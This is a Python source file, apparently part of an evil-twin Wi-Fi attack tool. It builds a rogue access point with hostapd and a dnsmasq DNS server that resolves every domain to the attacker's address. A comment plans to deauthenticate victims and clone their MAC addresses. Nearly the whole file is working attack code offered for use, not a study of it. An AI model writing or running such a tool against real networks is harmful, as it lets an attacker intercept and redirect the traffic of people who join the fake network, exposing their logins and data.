import os
import sys
import subprocess

class AccessPoint:
    def start_access_point(self, iface, ap_address, ap_range, channel, essid, mac):
        sys.stdout.write('[\033[32m+\033[0m] Setting Up Interface %s\n' % iface)
        self._setup_interface(iface, ap_address, mac)
        self._start_dhcp(iface, ap_address, ap_range)
        sys.stdout.write('[\033[32m+\033[0m] Dhcp Server Running\n')
        self._start_hostapd(iface, ap_address, channel, essid)
        sys.stdout.write('[\033[32m+\033[0m] Fake Access Point Running\n')

    def _setup_interface(self, iface, ap_address, mac):
        #sys.stdout.write('[\033[32m+\033[0m] %s Killing Processes\n' % iface)
        subprocess.call(['airmon-ng', 'stop', iface],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        #sys.stdout.write('[\033[32m+\033[0m] %s Down\n' % iface)
        subprocess.call(['ifconfig', iface, 'down'],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        #sys.stdout.write('[\033[32m+\033[0m] %s Monitor Mode\n' % iface)
        subprocess.call(['iwconfig', iface, 'mode', 'monitor'],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        #sys.stdout.write('[\033[32m+\033[0m] %s MTU 1400\n' % iface)
        subprocess.call(['ifconfig', iface, 'mtu', '1400'],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        #sys.stdout.write('[\033[32m+\033[0m] ifconfig %s up %s netmask 255.255.255.0\n' % (
        #    iface, ap_address))
        subprocess.call(['ifconfig', iface, 'up', ap_address, 'netmask', '255.255.255.0'],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        #sys.stdout.write('[\033[32m+\033[0m] route add -net %s netmask 255.255.255.0 gw %s\n' % (
        #    ap_address, ap_address))
        subprocess.call(['route', 'add', '-net', ap_address, 'netmask', '255.255.255.0', 'gw',
            ap_address], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        # skip changing mac address for now. in the future if I can
        # find a way to deauth them and take their mac address I will add this

    def _start_dhcp(self, iface, ap_address, ap_range):
        f = open('/tmp/dhcpd.conf', 'w+')
        f.write('no-resolv\n')
        f.write('interface=%s\n' % iface)
        f.write('dhcp-range=%s\n' % ap_range)
        f.write('address=/#/%s\n' % ap_address)
        f.close()
        os.system('echo > /var/lib/misc/dnsmasq.leases')
        subprocess.Popen(['dnsmasq', '-C', '/tmp/dhcpd.conf'],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    def _start_hostapd(self, iface, ap_address, channel, essid):
        f = open('/tmp/hostapd.conf', 'w+')
        f.write('interface=%s\n' % iface)
        f.write('driver=nl80211\n')
        f.write('ssid=%s\n' % essid)
        f.write('hw_mode=g\n')
        f.write('channel=%s\n' % channel)
        f.write('macaddr_acl=0\n')
        f.write('ignore_broadcast_ssid=0\n')
        f.close()
        subprocess.Popen(['hostapd', '/tmp/hostapd.conf'],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE)
